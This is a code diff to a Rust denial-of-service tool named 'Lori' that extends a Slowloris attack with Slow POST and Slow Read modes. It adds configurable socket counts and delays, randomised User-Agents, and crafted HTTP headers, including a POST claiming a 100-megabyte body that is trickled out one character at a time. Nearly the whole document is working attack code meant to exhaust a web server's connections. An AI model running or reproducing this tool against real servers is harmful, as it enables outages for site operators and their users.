@@ -1,10 +1,9 @@
 extern crate pretty_env_logger;
 #[macro_use] extern crate log;
 
-use std::env;
 use std::error::Error;
 use rayon::prelude::*;
-use openssl::ssl::{SslStream, SslMethod, SslConnector};
+// use openssl::ssl::{SslStream, SslMethod, SslConnector};
 use std::net::{Ipv4Addr, SocketAddr, TcpStream};
 use std::{thread, time};
 use std::io::{Read, Write};
@@ -39,6 +38,18 @@ pub const USER_AGENTS: &[&'static str]  = &[
     &"Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:49.0) Gecko/20100101 Firefox/49.0",
     ];
 
+// pub enum SocketType {
+//     Ssl(SslStream),
+//     Tcp(TcpStream)
+// }
+
+#[derive(Debug)]
+pub enum DOSType {
+    SlowLoris,
+    SlowPost,
+    SlowRead
+}
+
 /// Config of the DOS attack
 pub struct Config {
     /// https toggle
@@ -49,7 +60,14 @@ pub struct Config {
     pub port: u16,
     /// Use random User agents or not
     pub rand_ua: bool,
+    /// Amount of sockets to use
     pub socket_count: usize,
+    /// Type of DOS to use
+    pub dos_type: DOSType,
+    /// Amount of time to wait in between packets
+    pub delay: u64,
+    /// Size of read buffer for SlowRead attack 
+    pub read_size: usize
 }
 
 pub struct Lori<T> {
@@ -71,7 +89,7 @@ impl Lori<TcpStream> {
 
     /// Creates the inital sockets of the attack
     pub fn create_sockets(&mut self) -> Result<(), Box<dyn Error>> {
-        info!("Creating Initial Sockets");
+        info!("Creating Initial {} Sockets", self.config.socket_count);
         // Create inital scokets
         let mut sockets = (0..self.config.socket_count).into_par_iter().map(|i| {
 
@@ -92,7 +110,11 @@ impl Lori<TcpStream> {
     }
 
     pub fn attack(&mut self) -> Result<(), Box<dyn Error>> {
-        info!("Starting DOS attack on {:?}", self.config.addr);
+        info!("Starting {:?} DOS attack on {:?} with {} sockets", self.config.dos_type, self.config.addr, self.config.socket_count);
+
+        if self.config.rand_ua {
+            info!("Using random User-Agents...")
+        }
 
         let mut rng = rand::thread_rng();
 
@@ -113,9 +135,28 @@ impl Lori<TcpStream> {
                 // Generate number again
                 let y: u16 = rng.gen();
 
-                // Write to stream
-                let result = s.write_all(format!("X-a: {}\r\n", y).as_bytes());
-                let result = s.write_all(" ".as_bytes());
+                // Differ packet based on attack type
+                let result = match self.config.dos_type {
+                    // Normal SlowLoris
+                    DOSType::SlowLoris => {
+                        // Write to stream
+                        s.write_all(format!("X-a: {}\r\n", y).as_bytes())
+                            // result = s.write_all(" ".as_bytes());
+                    },
+                    // Slow POST Dos
+                    DOSType::SlowPost => {
+                        // Post a random character
+                        s.write_all(rng.gen::<char>().to_string().as_bytes())
+                    }
+                    DOSType::SlowRead => {
+                        let mut read_buffer = Vec::with_capacity(self.config.read_size);
+                        s.read(&mut read_buffer).unwrap();
+
+                        Ok(())
+
+
+                    }
+                };
 
                 // Remove if socket fails
                 if result.is_err(){
@@ -129,55 +170,42 @@ impl Lori<TcpStream> {
 
             let failed_socks = self.config.socket_count - self.connections.len();
 
-            warn!("Failed Sockets: {}", failed_socks);
 
-            let mut sockets = (0..(failed_socks)).into_par_iter().map(|i| {
+            if failed_socks > 0 {
+                warn!("Failed Sockets: {}", failed_socks);
 
-                trace!("Recreating Socket...");
+                info!("Repairing Sockets...");
 
-                // Create socket
-                let sock = init_socket(&self.config).unwrap();
+                let mut sockets = (0..(failed_socks)).into_par_iter().map(|_| {
 
-                sock
+                    trace!("Recreating Socket...");
 
-            }).collect::<Vec<TcpStream>>();
+                    // Create socket
+                    let sock = init_socket(&self.config).unwrap();
 
-            // Add to list
-            self.connections.append(&mut sockets);
+                    sock
 
+                }).collect::<Vec<TcpStream>>();
 
-            let delay = time::Duration::from_secs(15);
+                // Add to list
+                self.connections.append(&mut sockets);
+
+            }
+
+            let delay = time::Duration::from_secs(self.config.delay);
 
             thread::sleep(delay);
 
         }
 
-        Ok(())
     }
 }
 
 fn init_socket(config: &Config) -> Result<TcpStream, Box<dyn Error>>{
     // Create stream as normal
-    let mut stream: TcpStream = TcpStream::connect((&config.addr[..], config.port))?;
+    let mut stream = TcpStream::connect((&config.addr[..], config.port))?;
 
     let mut rng = rand::thread_rng();
-
-    // if stream.is_ok(){
-    //     log("Connected to target!", 2);
-    // } else {
-    //     log("Couldn't connect to target...", 1);
-    // };
-
-    // stream = stream.unwrap();
-
-    // Use https
-    // if config.https {
-    //     // Create SSL Connector
-    //     let mut connector = SslConnector::builder(SslMethod::tls()).unwrap().build();
-
-
-    //     stream = Stream::Ssl(connector.connect("google.com", stream)?);
-    // }
 
     let ua: &'static str;
 
@@ -188,18 +216,45 @@ fn init_socket(config: &Config) -> Result<TcpStream, Box<dyn Error>>{
         ua = USER_AGENTS[0];
     }
 
-    let mut rng = rand::thread_rng();
-
     let y: u16 = rng.gen();
 
-    let headers = format!("GET /?{} HTTP/1.1\r\nUser-Agent: {}\r\nAccept-language: en-US,en,q=0.5", y, ua);
-    // let headers = format!("GET /?{} HTTP/1.1\r\n", y);
+    let headers: String = match config.dos_type {
+        // DOSType::SlowLoris => format!("GET /?{} HTTP/1.1\r\nUser-Agent: {}\r\nAccept-language: en-US,en,q=0.5", y, ua),
+        DOSType::SlowPost => format!("POST / HTTP/1.1\r\nUser-Agent: {}\r\nConnection: keep-alive\r\nKeep-Alive: 900\r\nContent-Length: 100000000\r\nContent-Type: application/x-www-form-urlencoded\r\n\r\n", ua),
+        DOSType::SlowLoris => format!("GET /?{} HTTP/1.1\r\nUser-Agent: {}\r\nAccept-language: en-US,en,q=0.5", y, ua),
+        DOSType::SlowRead => format!("GET /?{} HTTP/1.1\r\nUser-Agent: {}\r\nAccept-language: en-US,en,q=0.5\r\n\r\n", y, ua),
+    };
 
+
+    // Use https
+    // if config.https {
+    //     // Create SSL Connector
+    //     let mut connector = SslConnector::builder(SslMethod::tls()).unwrap().build();
+
+    //     let url = String::new();
+
+    //     url.push_str(&config.addr);
+    //     url.push_str(&":");
+    //     url.push_str(&config.port.to_string());
+
+    //     let ssl_stream = connector.connect(&url, stream)?;
+
+    //     trace!("Headers:\n{}", headers);
+
+    //     // Send HTTP(S) request
+    //     ssl_stream.write_all(headers.as_bytes())?;
+
+
+    //     // Ok(ssl_stream)
+    // }
+    // else {
     trace!("Headers:\n{}", headers);
 
     // Send HTTP(S) request
     stream.write_all(headers.as_bytes())?;
 
-
     Ok(stream)
+        // }
+
+
 }
